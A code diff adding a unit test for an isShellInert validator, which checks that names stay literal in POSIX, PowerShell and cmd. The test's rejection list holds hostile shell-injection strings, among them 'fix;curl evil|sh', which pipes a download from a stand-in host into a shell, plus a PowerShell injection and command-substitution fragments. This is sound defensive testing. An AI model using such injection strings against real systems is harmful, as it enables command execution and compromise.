@@ -4,6 +4,7 @@ import {
 	hasPlatformModifier,
 	isAbsolutePath,
 	isMarkdownPath,
+	isShellInert,
 	layoutResourceIdentity,
 	normalizePath,
 	parseTupleKey,
@@ -30,6 +31,24 @@ test("platform shortcuts use Command on Apple platforms", () => {
 	expect(hasPlatformModifier({ ctrlKey: false, metaKey: true }, platform)).toBe(true);
 	expect(hasPlatformModifier({ ctrlKey: true, metaKey: false }, platform)).toBe(false);
 	expect(hasPlatformModifier({ ctrlKey: true, metaKey: true }, platform)).toBe(false);
+});
+
+test("isShellInert accepts only names that stay literal in POSIX, PowerShell, and cmd", () => {
+	expect(isShellInert("olga/plan-page")).toBe(true);
+	expect(isShellInert("release-1.2_rc")).toBe(true);
+	for (const hostile of [
+		"",
+		"-x",
+		"fix;curl evil|sh",
+		"a';Write-Output PWNED;#",
+		"a&b",
+		"$(x)",
+		"a`b",
+		"a%b%",
+		"a b",
+	]) {
+		expect(isShellInert(hostile)).toBe(false);
+	}
 });
 
 test("isMarkdownPath matches .md/.markdown case-insensitively, nothing else", () => {
